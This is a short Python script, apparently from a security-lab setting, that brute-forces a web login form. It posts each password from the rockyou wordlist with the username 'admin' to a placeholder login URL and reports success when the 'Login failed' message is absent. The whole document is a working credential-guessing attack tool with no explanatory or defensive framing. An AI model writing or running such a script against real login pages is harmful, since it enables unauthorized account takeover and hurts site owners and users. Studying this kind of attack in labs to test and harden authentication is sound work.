import requests
import sys
from colorama import init, Fore

init()

def guess_password(target_url, username, wordlist_path, action_type):
    parameters = {'username': username, 'password': '', 'Login': action_type}
    
    try:
        with open(wordlist_path, 'r') as word_list:
            for each_word in word_list:
                word = each_word.strip()
                parameters['password'] = word
                
                output = requests.post(target_url, data=parameters)
                
                if 'Login failed' not in output.text:
                    print(f"{Fore.GREEN}[+] Password found! >>> {word}")
                    sys.exit(0)
            
        print(f"{Fore.RED}[-] Password not found")
    
    except Exception as e:
        print(f"{Fore.RED}[-] An error occurred: {e}")
        sys.exit(1)

guess_password('http://example.com/login', 'admin', '/home/kali/bruteforce/rockyou.txt', 'submit')
